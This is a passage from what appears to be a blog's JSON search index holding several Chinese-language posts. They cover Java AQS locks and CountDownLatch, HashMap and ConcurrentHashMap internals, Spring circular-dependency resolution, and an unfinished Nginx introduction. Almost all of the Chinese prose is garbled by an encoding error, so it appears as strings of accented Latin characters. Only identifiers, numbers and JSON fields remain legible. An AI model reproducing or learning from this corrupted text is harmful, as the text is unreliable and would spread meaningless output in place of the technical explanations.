CountDownLatch éƒ½æ˜¯è‡ªå®šä¹‰åŒæ­¥å™¨ï¼Œå®ƒä»¬çš„å†…éƒ¨ç±» Sync éƒ½æ˜¯ç»§æ‰¿äº† AbstractQueuedSynchronizerï¼Œç‹¬å é”å’Œå…±äº«é”çš„åŒºåˆ«åœ¨äºå„è‡ªé‡å†™çš„è·å–å’Œé‡Šæ”¾å…±äº«èµ„æºçš„æ–¹å¼ä¸ä¸€æ ·ï¼Œè‡³äºçº¿ç¨‹è·å–èµ„æºå¤±è´¥ã€å”¤é†’å‡ºé˜Ÿã€ä¸­æ–­ç­‰æ“ä½œ AQS å·²ç»å®ç°å¥½äº†ã€‚ ReentrantLock state çš„åˆå§‹å€¼æ˜¯ 0ï¼Œå³æ²¡æœ‰è¢«é”å®šï¼Œå½“ A çº¿ç¨‹ tryAcquire() æ—¶ä¼šç‹¬å é”ä½ stateï¼Œå¹¶ä¸”æŠŠ state+1ï¼Œç„¶å B çº¿ç¨‹ï¼ˆå³å…¶ä»–çº¿ç¨‹ï¼‰tryAcquire() æ—¶å°±ä¼šå¤±è´¥è¿›å…¥ç­‰å¾…é˜Ÿåˆ—ï¼Œç›´åˆ° A çº¿ç¨‹ tryRelease() é‡Šæ”¾é”æŠŠ state-1ï¼Œæ­¤æ—¶ä¹Ÿæœ‰å¯èƒ½å‡ºç°é‡å…¥é”çš„æƒ…å†µï¼Œstate-1 åçš„å€¼ä¸æ˜¯ 0 è€Œæ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼Œå› ä¸ºé‡å…¥é”ä¹Ÿä¼š state+1ï¼Œåªæœ‰å½“ state=0 æ—¶ï¼Œæ‰ä»£è¡¨å…¶ä»–çº¿ç¨‹å¯ä»¥ tryAcquire() è·å–é”ã€‚ CountDownLatch 8 äººèµ›è·‘åœºæ™¯ï¼Œå³å¼€å¯ 8 ä¸ªçº¿ç¨‹è¿›è¡Œèµ›è·‘ï¼Œstate çš„åˆå§‹å€¼è®¾ç½®ä¸º 8ï¼ˆå¿…é¡»ä¸çº¿ç¨‹æ•°ä¸€è‡´ï¼‰ï¼Œæ¯ä¸ªå‚èµ›è€…è·‘åˆ°ç»ˆç‚¹ï¼ˆå³çº¿ç¨‹æ‰§è¡Œå®Œæ¯•ï¼‰åˆ™è°ƒç”¨ countDown()ï¼Œä½¿ç”¨ CAS æ“ä½œæŠŠ state-1ï¼Œç›´åˆ° 8 ä¸ªå‚èµ›è€…éƒ½è·‘åˆ°ç»ˆç‚¹äº†ï¼ˆå³ state=0ï¼‰ï¼Œæ­¤æ—¶è°ƒç”¨ await() åˆ¤æ–­ state æ˜¯å¦ä¸º 0ï¼Œå¦‚æœæ˜¯ 0 åˆ™ä¸é˜»å¡ç»§ç»­æ‰§è¡Œåé¢çš„ä»£ç ã€‚ tryAcquire()ã€tryRelease()ã€tryAcquireShared()ã€tryReleaseShared() çš„è¯¦ç»†æµç¨‹åˆ†æ tryAcquire() è¯¦ç»†æµç¨‹å¦‚ä¸‹ï¼š è°ƒç”¨ tryAcquire() å°è¯•è·å–å…±äº«èµ„æºï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å› true; å¦‚æœä¸æˆåŠŸï¼Œåˆ™è°ƒç”¨ addWaiter() æŠŠæ­¤çº¿ç¨‹æ„é€ ä¸€ä¸ª Node èŠ‚ç‚¹ï¼ˆæ ‡è®°ä¸ºç‹¬å æ¨¡å¼ï¼‰ï¼Œå¹¶ä½¿ç”¨ CAS æ“ä½œæŠŠèŠ‚ç‚¹è¿½åŠ åˆ°ç­‰å¾…é˜Ÿåˆ—çš„å°¾éƒ¨ï¼Œç„¶åè¯¥ Node èŠ‚ç‚¹çš„çº¿ç¨‹è¿›å…¥è‡ªæ—‹çŠ¶æ€; çº¿ç¨‹è‡ªæ—‹æ—¶ï¼Œåˆ¤æ–­è‡ªæ—‹èŠ‚ç‚¹çš„å‰é©±èŠ‚ç‚¹æ˜¯ä¸æ˜¯å¤´ç»“ç‚¹ï¼Œå¹¶ä¸”å·²ç»é‡Šæ”¾å…±äº«èµ„æºï¼ˆå³ state=0ï¼‰ï¼Œè‡ªæ—‹èŠ‚ç‚¹æ˜¯å¦æˆåŠŸè·å–å…±äº«èµ„æºï¼ˆå³ state=1ï¼‰ï¼Œå¦‚æœä¸‰ä¸ªæ¡ä»¶éƒ½æˆç«‹åˆ™è‡ªæ—‹èŠ‚ç‚¹è®¾ç½®ä¸ºå¤´èŠ‚ç‚¹ï¼Œå¦‚æœä¸æˆç«‹åˆ™æŠŠè‡ªæ—‹èŠ‚ç‚¹çš„çº¿ç¨‹æŒ‚èµ·ï¼Œç­‰å¾…å‰é©±èŠ‚ç‚¹å”¤é†’ã€‚ img tryRelease() è¯¦ç»†æµç¨‹å¦‚ä¸‹ï¼š è°ƒç”¨ tryRelease() é‡Šæ”¾å…±äº«èµ„æºï¼Œå³ state=0ï¼Œç„¶åå”¤é†’æ²¡æœ‰è¢«ä¸­æ–­çš„åé©±èŠ‚ç‚¹çš„çº¿ç¨‹; è¢«å”¤é†’çš„çº¿ç¨‹è‡ªæ—‹ï¼Œåˆ¤æ–­è‡ªæ—‹èŠ‚ç‚¹çš„å‰é©±èŠ‚ç‚¹æ˜¯ä¸æ˜¯å¤´ç»“ç‚¹ï¼Œæ˜¯å¦å·²ç»é‡Šæ”¾å…±äº«èµ„æºï¼ˆå³ state=0ï¼‰ï¼Œè‡ªæ—‹èŠ‚ç‚¹æ˜¯å¦æˆåŠŸè·å–å…±äº«èµ„æºï¼ˆå³ state=1ï¼‰ï¼Œå¦‚æœä¸‰ä¸ªæ¡ä»¶éƒ½æˆç«‹åˆ™è‡ªæ—‹èŠ‚ç‚¹è®¾ç½®ä¸ºå¤´èŠ‚ç‚¹ï¼Œå¦‚æœä¸æˆç«‹åˆ™æŠŠè‡ªæ—‹èŠ‚ç‚¹çš„çº¿ç¨‹æŒ‚èµ·ï¼Œç­‰å¾…è¢«å‰é©±èŠ‚ç‚¹å”¤é†’ã€‚ tryAcquireShared() è¯¦ç»†æµç¨‹å¦‚ä¸‹ï¼š è°ƒç”¨ tryAcquireShared() å°è¯•è·å–å…±äº«èµ„æºï¼Œå¦‚æœ state&gt;=0ï¼Œåˆ™è¡¨ç¤ºåŒæ­¥çŠ¶æ€ï¼ˆstateï¼‰æœ‰å‰©ä½™è¿˜å¯ä»¥è®©å…¶ä»–çº¿ç¨‹è·å–å…±äº«èµ„æºï¼Œæ­¤æ—¶è·å–æˆåŠŸè¿”å›; å¦‚æœ state&lt;0ï¼Œåˆ™è¡¨ç¤ºè·å–å…±äº«èµ„æºå¤±è´¥ï¼ŒæŠŠæ­¤çº¿ç¨‹æ„é€ ä¸€ä¸ª Node èŠ‚ç‚¹ï¼ˆæ ‡è®°ä¸ºå…±äº«æ¨¡å¼ï¼‰ï¼Œå¹¶ä½¿ç”¨ CAS æ“ä½œæŠŠèŠ‚ç‚¹è¿½åŠ åˆ°ç­‰å¾…é˜Ÿåˆ—çš„å°¾éƒ¨ï¼Œç„¶åè¯¥ Node èŠ‚ç‚¹çš„çº¿ç¨‹è¿›å…¥è‡ªæ—‹çŠ¶æ€; çº¿ç¨‹è‡ªæ—‹æ—¶ï¼Œåˆ¤æ–­è‡ªæ—‹èŠ‚ç‚¹çš„å‰é©±èŠ‚ç‚¹æ˜¯ä¸æ˜¯å¤´ç»“ç‚¹ï¼Œæ˜¯å¦å·²ç»é‡Šæ”¾å…±äº«èµ„æºï¼ˆå³ state=0ï¼‰ï¼Œå†è°ƒç”¨ tryAcquireShared() å°è¯•è·å–å…±äº«èµ„æºï¼Œå¦‚æœä¸‰ä¸ªæ¡ä»¶éƒ½æˆç«‹ï¼Œåˆ™è¡¨ç¤ºè‡ªæ—‹èŠ‚ç‚¹å¯æ‰§è¡Œï¼ŒåŒæ—¶æŠŠè‡ªæ—‹èŠ‚ç‚¹è®¾ç½®ä¸ºå¤´èŠ‚ç‚¹ï¼Œå¹¶ä¸”å”¤é†’æ‰€æœ‰åç»§èŠ‚ç‚¹çš„çº¿ç¨‹ã€‚ å¦‚æœä¸æˆç«‹ï¼ŒæŒ‚èµ·è‡ªæ—‹çš„çº¿ç¨‹ï¼Œç­‰å¾…è¢«å‰é©±èŠ‚ç‚¹å”¤é†’ã€‚ tryReleaseShared() è¯¦ç»†æµç¨‹å¦‚ä¸‹ï¼š è°ƒç”¨ tryReleaseShared() é‡Šæ”¾å…±äº«èµ„æºï¼Œå³ state-1ï¼Œç„¶åéå†æ•´ä¸ªé˜Ÿåˆ—ï¼Œå”¤é†’æ‰€æœ‰æ²¡æœ‰è¢«ä¸­æ–­çš„åé©±èŠ‚ç‚¹çš„çº¿ç¨‹; è¢«å”¤é†’çš„çº¿ç¨‹è‡ªæ—‹ï¼Œåˆ¤æ–­è‡ªæ—‹èŠ‚ç‚¹çš„å‰é©±èŠ‚ç‚¹æ˜¯ä¸æ˜¯å¤´ç»“ç‚¹ï¼Œæ˜¯å¦å·²ç»é‡Šæ”¾å…±äº«èµ„æºï¼ˆå³ state=0ï¼‰ï¼Œå†è°ƒç”¨ tryAcquireShared() å°è¯•è·å–å…±äº«èµ„æºï¼Œå¦‚æœä¸‰ä¸ªæ¡ä»¶éƒ½æˆç«‹ï¼Œåˆ™è¡¨ç¤ºè‡ªæ—‹èŠ‚ç‚¹å¯æ‰§è¡Œï¼ŒåŒæ—¶æŠŠè‡ªæ—‹èŠ‚ç‚¹è®¾ç½®ä¸ºå¤´èŠ‚ç‚¹ï¼Œå¹¶ä¸”å”¤é†’æ‰€æœ‰åç»§èŠ‚ç‚¹çš„çº¿ç¨‹ã€‚ å¦‚æœä¸æˆç«‹ï¼ŒæŒ‚èµ·è‡ªæ—‹çš„çº¿ç¨‹ï¼Œç­‰å¾…è¢«å‰é©±èŠ‚ç‚¹å”¤é†’ã€‚","categories":[],"tags":[{"name":"Concurrency","slug":"Concurrency","permalink":"https://blog.kayleh.top/tags/Concurrency/"}]},{"title":"Head First Map","slug":"head-first-hashmap","date":"2021-04-17T09:31:12.000Z","updated":"2021-04-17T18:29:25.128Z","comments":true,"path":"head-first-hashmap/","link":"","permalink":"https://blog.kayleh.top/head-first-hashmap/","excerpt":"","text":"æ·±å…¥æµ…å‡ºMap Mapæ˜¯javaé‡Œè¾¹æ˜¯ä¸€ä¸ªæ¥å£,å¸¸è§çš„å®ç°ç±»æœ‰HashMapã€LinkedHashMapã€TreeMapå’ŒConcurrentHashMap HashMapåº•å±‚æ•°æ®ç»“æ„æ˜¯æ•°ç»„+é“¾è¡¨/çº¢é»‘æ ‘ LinkedHashMapåº•å±‚æ•°æ®ç»“æ„æ˜¯æ•°ç»„+é“¾è¡¨+åŒå‘é“¾è¡¨ TreeMapåº•å±‚æ•°æ®ç»“æ„æ˜¯çº¢é»‘æ ‘ ConcurrentHashMapåº•å±‚æ•°æ®ç»“æ„æ˜¯æ•°ç»„+é“¾è¡¨/çº¢é»‘æ ‘ HashMap ç®€å•æ€»ç»“HashMapï¼š æ— åºï¼Œå…è®¸ä¸ºnullï¼ŒéåŒæ­¥ åº•å±‚ç”±æ•£åˆ—è¡¨(å“ˆå¸Œè¡¨)å®ç° åˆå§‹å®¹é‡å’Œè£…è½½å› å­å¯¹HashMapå½±å“æŒºå¤§çš„ï¼Œè®¾ç½®å°äº†ä¸å¥½ï¼Œè®¾ç½®å¤§äº†ä¹Ÿä¸å¥½ newä¸€ä¸ªhashmapæ—¶ä¼šå‘ç”Ÿä»€ä¹ˆ?HashMapæœ‰å‡ ä¸ªæ„é€ æ–¹æ³•,ä½†æœ€ä¸»è¦çš„å°±æ˜¯æŒ‡å®šåˆå§‹å€¼ä»¥åŠè´Ÿè½½å› å­çš„å¤§å°.å¦‚æœä¸æŒ‡å®š,é»˜è®¤hashmapçš„å¤§å°ä¸º16,è´Ÿè½½å› å­çš„å¤§å°ä¸º0.75. HashMapçš„å¤§å°åªèƒ½æ˜¯2æ¬¡å¹‚,ï¼ˆå› ä¸ºåªæœ‰å¤§å°ä¸º2æ¬¡å¹‚æ—¶ï¼Œæ‰èƒ½åˆç†ç”¨ä½è¿ç®—æ›¿ä»£å–æ¨¡ï¼‰ å‡å¦‚ä¼ ä¸€ä¸ª10è¿›å»,å®é™…å¤§å°æ˜¯16. å‡å¦‚ä¼ å…¥ä¸€ä¸ª7è¿›å»,hashmapæœ€ç»ˆå¤§å°æ˜¯8,å…·ä½“å®ç°åœ¨tableSizeForå¯ä»¥çœ‹åˆ° æŠŠå…ƒç´ æ”¾è¿›hashmapçš„æ—¶å€™ï¼Œéœ€è¦ç®—å‡ºè¿™ä¸ªå…ƒç´ æ‰€åœ¨çš„ä½ç½®ï¼ˆhashï¼‰ï¼Œåœ¨hashmapé‡Œç”¨çš„æ˜¯ä½è¿ç®—æ¥ä»£æ›¿å–æ¨¡ï¼Œèƒ½å¤Ÿæ›´åŠ é«˜æ•ˆåœ°ç®—å‡ºè¯¥å…ƒç´ æ‰€åœ¨çš„ä½ç½®ã€‚ è€Œè´Ÿè½½å› å­çš„å¤§å°å†³å®šç€å“ˆå¸Œè¡¨çš„æ‰©å®¹å’Œå“ˆå¸Œå†²çªã€‚ æ¯”å¦‚é»˜è®¤hashmapçš„å¤§å°ä¸º16,è´Ÿè½½å› å­çš„å¤§å°ä¸º0.75.è¿™æ„å‘³ç€æ•°ç»„æœ€å¤šåªèƒ½æ”¾16Ã—0.75=12ä¸ªå…ƒç´ ï¼Œä¸€æ—¦è¶…è¿‡12ä¸ªå…ƒç´ ï¼Œåˆ™å“ˆå¸Œè¡¨éœ€è¦æ‰©å®¹ã€‚æ¯æ¬¡Putå…ƒç´ çš„æ—¶å€™éƒ½ä¼šæ£€æŸ¥hashmapçš„å¤§å°æœ‰æ²¡æœ‰è¶…è¿‡è¿™ä¸ªé˜ˆå€¼ï¼Œå¦‚æœè¶…è¿‡åˆ™æ‰©å®¹ã€‚ é‰´äºï¼ˆHashMapçš„å¤§å°åªèƒ½æ˜¯2æ¬¡å¹‚ï¼‰ï¼Œæ‰€ä»¥æ‰©å®¹çš„æ—¶å€™é»˜è®¤æ‰©å®¹ä¸ºåŸæ¥çš„2å€ã€‚ æ‰©å®¹æ˜¯è€—æ—¶çš„,ä¹Ÿå¯ä»¥é€šè¿‡è°ƒé«˜è´Ÿè½½å› å­æ¥å‡å°‘æ‰©å®¹. ä½†æ˜¯ä¸€èˆ¬ä¸æ¨èè¿™æ ·åš,å› ä¸ºè¿™æ ·æ„å‘³ç€å“ˆå¸Œå†²çªçš„æ¦‚ç‡ä¼šå¢é«˜,å“ˆå¸Œå†²çªçš„æ¦‚ç‡å¢é«˜åŒæ ·ä¼šè€—æ—¶(å› ä¸ºæŸ¥æ‰¾çš„é€Ÿåº¦å˜æ…¢äº†) Putå…ƒç´ æ€ä¹ˆè®¡ç®—hashï¼Ÿ putå…ƒç´ çš„æ—¶å€™ï¼Œå…ˆç®—å‡ºæ­£å¸¸çš„å“ˆå¸Œå€¼ï¼Œç„¶åä¸é«˜16ä½åšå¼‚æˆ–è¿ç®—ï¼Œäº§ç”Ÿæœ€ç»ˆçš„å“ˆå¸Œå€¼ã€‚å¥½å¤„æ˜¯å¢åŠ äº†éšæœºæ€§ï¼Œå‡å°‘äº†ç¢°æ’å†²çªçš„å¯èƒ½æ€§ã€‚ putå’Œgetçš„å®ç° put é¦–å…ˆå¯¹keyåšhashè¿ç®—ï¼Œè®¡ç®—å‡ºè¯¥keyæ‰€åœ¨çš„indexã€‚ å¦‚æœæ²¡ç¢°æ’ï¼Œç›´æ¥æ”¾åˆ°æ•°ç»„ä¸­ï¼Œå¦‚æœç¢°æ’äº†ï¼Œéœ€è¦åˆ¤æ–­ç›®å‰æ•°æ®ç»“æ„æ˜¯é“¾è¡¨è¿˜æ˜¯çº¢é»‘æ ‘ï¼Œæ ¹æ®ä¸åŒçš„æƒ…å†µæ¥è¿›è¡Œæ’å…¥ã€‚ å‡å¦‚keyç›¸åŒçš„ï¼Œåˆ™æ›¿æ¢åˆ°åŸæ¥çš„å€¼ã€‚æœ€ååˆ¤æ–­å“ˆå¸Œè¡¨æ˜¯å¦æ»¡äº†ï¼ˆå½“å‰å“ˆå¸Œè¡¨å¤§å°Ã—è´Ÿè½½å› å­ï¼‰ï¼Œå¦‚æœæ»¡äº†ï¼Œåˆ™æ‰©å®¹ã€‚ get è¿˜æ˜¯å¯¹keyåšhashè¿ç®—ï¼Œè®¡ç®—å‡ºè¯¥keyæ‰€åœ¨çš„indexï¼Œç„¶ååˆ¤æ–­æ˜¯å¦æœ‰å“ˆå¸Œå†²çªã€‚ å‡å¦‚æ²¡æœ‰å†²çªåˆ™ç›´æ¥è¿”å›ã€‚å‡è®¾æœ‰å†²çªåˆ™åˆ¤æ–­ç›®å‰æ•°æ®ç»“æ„æ˜¯é“¾è¡¨è¿˜æ˜¯çº¢é»‘æ ‘ï¼Œåˆ†åˆ«ä»ä¸åŒçš„æ•°æ®ç»“æ„ä¸­å–å‡ºã€‚ åœ¨hashmapä¸­ï¼Œæ€ä¹ˆåˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦ç›¸åŒï¼Ÿé¦–å…ˆæ¯”è¾ƒhashå€¼ï¼Œéšåä¼šç”¨==è¿ç®—ç¬¦å’Œequals()æ¥åˆ¤æ–­è¯¥å…ƒç´ æ˜¯å¦ç›¸åŒã€‚ è¯´ç™½äº†ï¼Œå°±æ˜¯ï¼š å¦‚æœåªæœ‰hashå€¼ç›¸åŒï¼Œé‚£è¯´æ˜è¯¥å…ƒç´ hashå†²çªäº†ï¼Œå¦‚æœhashå€¼å’Œequal() || == éƒ½ç›¸åŒï¼Œé‚£è¯´æ˜è¯¥å…ƒç´ æ˜¯åŒä¸€ä¸ªã€‚ ä»€ä¹ˆæƒ…å†µä¸‹ä¼šè½¬çº¢é»‘æ ‘ï¼Ÿ å½“æ•°ç»„å¤§å°&gt;64ä¸”é“¾è¡¨çš„å¤§å°&gt;8çš„æ—¶å€™æ‰ä¼šå°†é“¾è¡¨è½¬ä¸ºçº¢é»‘æ ‘ã€‚å½“çº¢é»‘æ ‘å¤§å°ä¸º6æ—¶ï¼Œä¼šé€€åŒ–ä¸ºé“¾è¡¨ã€‚ è¿™é‡Œè½¬çº¢é»‘æ ‘é€€åŒ–ä¸ºé“¾è¡¨çš„æ“ä½œä¸»è¦å‡ºäºæŸ¥è¯¢å’Œæ’å…¥æ—¶å¯¹æ€§èƒ½çš„è€ƒé‡ é“¾è¡¨çš„æŸ¥è¯¢æ—¶é—´å¤æ‚åº¦ä¸ºO(N),æ’å…¥æ—¶é—´å¤æ‚åº¦ä¸ºO(1),çº¢é»‘æ ‘æŸ¥è¯¢å’Œæ’å…¥æ—¶é—´å¤æ‚åº¦ä¸ºO(logN) çº¿ç¨‹å®‰å…¨ï¼Ÿ HashMapæ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„ï¼Œåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼ŒHashMapæœ‰å¯èƒ½ä¼šæœ‰æ•°æ®ä¸¢å¤±å’Œè·å–ä¸äº†æœ€æ–°æ•°æ®çš„é—®é¢˜ï¼Œæ¯”å¦‚çº¿ç¨‹A putè¿›å»äº†ï¼Œçº¿ç¨‹B getä¸å‡ºæ¥ã€‚ LinkedHashMap å®é™…ä¸Šç»§æ‰¿äº†HashMapï¼Œåœ¨HashMapçš„åŸºç¡€ä¸Šç»´æŠ¤äº†ä¸€ä¸ªåŒå‘é“¾è¡¨ã€‚ æœ‰äº†è¿™ä¸ªåŒå‘é“¾è¡¨ï¼Œæ’å…¥çš„é¡ºåºæ˜¯æœ‰åºçš„ã€‚ LinkedHashMapåœ¨éå†çš„æ—¶å€™ï¼Œå®é™…ä¸Šæ˜¯ç”¨çš„æ˜¯åŒå‘é“¾è¡¨æ¥éå†çš„ï¼Œæ‰€ä»¥LinkedHashMapçš„å¤§å°ä¸ä¼šå½±å“åˆ°éå†çš„æ€§èƒ½ TreeMap TreeMapçš„keyä¸èƒ½ä¸ºnullï¼ˆå¦‚æœä¸ºnullå°±ä¸èƒ½æ’åºï¼‰ï¼ŒTreeMapæœ‰åºæ˜¯é€šè¿‡Comparatoræ¥è¿›è¡Œæ¯”è¾ƒçš„ï¼Œå¦‚æœ Comparatorä¸ºnullï¼Œé‚£ä¹ˆå°±ä½¿ç”¨è‡ªç„¶é¡ºåº ConcurrentHashMap ConcurrentHashMapæ˜¯JUCåŒ…ä¸‹çš„çº¿ç¨‹å®‰å…¨çš„Mapå®ç°ç±»ï¼Œä»–èƒ½æ”¯æŒé«˜å¹¶å‘çš„è®¿é—®å’Œæ›´æ–°ã€‚ çº¿ç¨‹å®‰å…¨çš„Mapå®ç°ç±»è¿˜æœ‰HashTableï¼Œè¿˜æœ‰å¯ä»¥ä½¿ç”¨Collectionsæ¥åŒ…è£…å‡ºä¸€ä¸ªçº¿ç¨‹å®‰å…¨çš„Mapã€‚ ä½†æ˜¯HashTableè¿˜æ˜¯Collectionsæ¥åŒ…è£…å‡ºæ¥çš„ï¼Œéƒ½æ¯”è¾ƒä½æ•ˆï¼Œå› ä¸ºéƒ½æ˜¯ç›´æ¥åœ¨å¤–å±‚å¥—synchronizeã€‚ æ‰€ä»¥ä¸€èˆ¬æœ‰çº¿ç¨‹å®‰å…¨é—®é¢˜è€ƒé‡çš„ï¼Œéƒ½ä½¿ç”¨ConcurrentHashMapã€‚ ConcurrentHashMapé€šè¿‡åœ¨éƒ¨åˆ†åŠ é”å’Œåˆ©ç”¨CASç®—æ³•æ¥å®ç°åŒæ­¥ï¼Œåœ¨getçš„æ—¶å€™æ²¡æœ‰åŠ é”ï¼ŒNodeéƒ½ç”¨äº†volatileç»™ä¿®é¥°ã€‚ åœ¨æ‰©å®¹æ—¶ï¼Œä¼šç»™æ¯ä¸ªçº¿ç¨‹åˆ†é…å¯¹åº”çš„åŒºé—´ï¼Œå¹¶ä¸”ä¸ºäº†é˜²æ­¢putValå¯¼è‡´æ•°æ®ä¸ä¸€è‡´ï¼Œä¼šç»™çº¿ç¨‹çš„æ‰€è´Ÿè´£çš„åŒºé—´åŠ é”ã€‚","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"Spring Cyclic Ependencies","slug":"Spring-cyclic-ependencies","date":"2021-04-16T07:36:37.000Z","updated":"2021-04-16T16:00:21.003Z","comments":true,"path":"Spring-cyclic-ependencies/","link":"","permalink":"https://blog.kayleh.top/Spring-cyclic-ependencies/","excerpt":"","text":"Springæ˜¯æ€ä¹ˆè§£å†³å¾ªç¯ä¾èµ–çš„ï¼Ÿé¦–å…ˆç«™åœ¨Springæ•´ä¸ªFrameworkä½“ç³»è€Œè¨€çš„è¯ï¼ŒSpringçš„Beanæ˜¯ç”±ä¸€ä¸ªBeanDefinitionæ¥çš„ï¼Œå°±æ˜¯åœ¨Springå½“ä¸­ï¼Œæœ‰ä¸€ä¸ªå«å»ºæ¨¡çš„ç±»BeanDefinitionï¼ŒSpringçš„Beanæœ‰ä¸€ç³»åˆ—æ¯”è¾ƒå¤æ‚çš„ç”Ÿå‘½å‘¨æœŸï¼š é¦–å…ˆï¼ŒSpringå®¹å™¨å¯åŠ¨ã€‚ springè¿›è¡Œæ‰«æ åå°„åå°è£…æˆbeanDefinitionå¯¹è±¡ï¼Œæ”¾å…¥beanDefinitionMap éå†map éªŒè¯ï¼ˆæ˜¯å¦å•ä¾‹ã€æ˜¯å¦å»¶è¿ŸåŠ è½½ã€æ˜¯å¦æŠ½è±¡ï¼‰ æ¨æ–­æ„é€ æ–¹æ³•ï¼ˆ æŠŠå½“å‰è¿™ä¸ªSpring Beanæ‰€ä»£è¡¨çš„ç±»å½“ä¸­çš„æ„é€ æ–¹æ³•å¾—åˆ°ä¸€ä¸ªæœ€ä½³çš„ä¸€ä¸ªæ„é€ æ–¹æ³• ï¼‰ å‡†å¤‡å¼€å§‹è¿›è¡Œå®ä¾‹ å»å•ä¾‹æ± ä¸­æŸ¥ï¼Œæ²¡æœ‰â€”â€”ã€‹å»äºŒçº§ç¼“å­˜ä¸­æ‰¾ï¼Œæ²¡æœ‰æå‰æš´éœ²â€”â€”ã€‹ç”Ÿæˆä¸€ä¸ªobjectFactoryå¯¹è±¡æš´éœ²åˆ°äºŒçº§ç¼“å­˜ä¸­â€”â€”ã€‹å±æ€§æ³¨å…¥ï¼Œå‘ç°ä¾èµ–Yâ€”â€”ã€‹æ­¤æ—¶Yå¼€å§‹å®ƒçš„ç”Ÿå‘½å‘¨æœŸç›´åˆ°å±æ€§æ³¨å…¥ï¼Œå‘ç°ä¾èµ–X-&gt;Xåˆèµ°ä¸€éç”Ÿå‘½å‘¨æœŸï¼Œå½“èµ°åˆ°å»äºŒçº§ç¼“å­˜ä¸­æ‰¾çš„æ—¶å€™æ‰¾åˆ°äº†-&gt;å¾€Yä¸­æ³¨å…¥Xçš„objectFactoryå¯¹è±¡-&gt;å®Œæˆå¾ªç¯ä¾èµ–ã€‚ 1ã€ä¸ºä»€ä¹ˆè¦ä½¿ç”¨Xçš„objectFacoryå¯¹è±¡è€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨Xå¯¹è±¡ï¼Ÿ åˆ©äºæ‹“å±•ï¼Œç¨‹åºå‘˜å¯ä»¥é€šè¿‡beanPostProcessæ¥å£æ“ä½œobjectFactoryå¯¹è±¡ç”Ÿæˆè‡ªå·±æƒ³è¦çš„å¯¹è±¡ 2ã€æ˜¯ä¸æ˜¯åªèƒ½æ”¯æŒå•ä¾‹(scope=singleton)è€Œä¸æ”¯æŒåŸå‹(scope=prototype)ï¼Ÿ æ˜¯ã€‚å› ä¸ºå•ä¾‹æ˜¯springåœ¨å¯åŠ¨æ—¶è¿›è¡ŒbeanåŠ è½½æ”¾å…¥å•ä¾‹æ± ä¸­ï¼Œåœ¨ä¾èµ–çš„beanå¼€å§‹ç”Ÿå‘½å‘¨æœŸåï¼Œå¯ä»¥ç›´æ¥ä»äºŒçº§ç¼“å­˜ä¸­å–åˆ°å®ƒæ‰€ä¾èµ–çš„beançš„objectFactoryå¯¹è±¡ä»è€Œç»“æŸå¾ªç¯ä¾èµ–ã€‚è€ŒåŸå‹åªæœ‰åœ¨ç”¨åˆ°æ—¶æ‰ä¼šèµ°ç”Ÿå‘½å‘¨æœŸæµç¨‹ï¼Œä½†æ˜¯åŸå‹ä¸å­˜åœ¨ä¸€ä¸ªå·²ç»å®ä¾‹åŒ–å¥½çš„beanï¼Œæ‰€ä»¥ä¼šæ— é™çš„åˆ›å»º-&gt;ä¾èµ–-&gt;åˆ›å»º-&gt;ä¾èµ–-&gt;â€¦ã€‚ 3ã€å¾ªç¯ä¾èµ–æ˜¯ä¸æ˜¯åªæ”¯æŒéæ„é€ æ–¹æ³•ï¼Ÿ æ˜¯ã€‚ç±»ä¼¼æ­»é”é—®é¢˜","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://blog.kayleh.top/tags/frame/"}]},{"title":"Head First Nginx","slug":"Head-First-nginx","date":"2021-04-14T21:55:17.000Z","updated":"2021-04-15T15:12:41.680Z","comments":true,"path":"Head-First-nginx/","link":"","permalink":"https://blog.kayleh.top/Head-First-nginx/","excerpt":"","text":"å…¬å¸äº§å“å‡ºç°ç“¶é¢ˆï¼Ÿæˆ‘ä»¬å…¬å¸é¡¹ç›®åˆšåˆšä¸Šçº¿çš„æ—¶å€™ï¼Œå¹¶å‘é‡å°ï¼Œç”¨æˆ·ä½¿ç”¨çš„å°‘ï¼Œæ‰€ä»¥åœ¨ä½å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œä¸€ä¸ªjaråŒ…å¯åŠ¨åº”ç”¨å°±å¤Ÿäº†ï¼Œç„¶åå†…éƒ¨tomcatè¿”å›å†…å®¹ç»™ç”¨æˆ·ã€‚ä½†æ˜¯æ…¢æ…¢çš„ï¼Œä½¿ç”¨æˆ‘ä»¬å¹³å°çš„ç”¨æˆ·è¶Šæ¥è¶Šå¤šäº†ï¼Œå¹¶å‘é‡æ…¢æ…¢å¢å¤§äº†ï¼Œè¿™æ—¶å€™ä¸€å°æœåŠ¡å™¨æ»¡è¶³ä¸äº†æˆ‘ä»¬çš„éœ€æ±‚äº†ã€‚äºæ˜¯æˆ‘ä»¬æ¨ªå‘æ‰©å±•ï¼Œåˆå¢åŠ äº†æœåŠ¡å™¨ã€‚è¿™ä¸ªæ—¶å€™å‡ ä¸ªé¡¹ç›®å¯åŠ¨åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œç”¨æˆ·è¦è®¿é—®ï¼Œå°±éœ€è¦å¢åŠ ä¸€ä¸ªä»£ç†æœåŠ¡å™¨äº†ï¼Œé€šè¿‡ä»£ç†æœåŠ¡å™¨æ¥å¸®æˆ‘ä»¬è½¬å‘å’Œå¤„ç†è¯·æ±‚ã€‚æˆ‘ä»¬å¸Œæœ›è¿™ä¸ªä»£ç†æœåŠ¡å™¨å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ¥æ”¶ç”¨æˆ·çš„è¯·æ±‚ï¼Œç„¶åå°†ç”¨æˆ·çš„è¯·æ±‚æŒ‰ç…§è§„åˆ™å¸®æˆ‘ä»¬è½¬å‘åˆ°ä¸åŒçš„æœåŠ¡å™¨èŠ‚ç‚¹ä¹‹ä¸Šã€‚è¿™ä¸ªè¿‡ç¨‹ç”¨æˆ·æ˜¯æ— 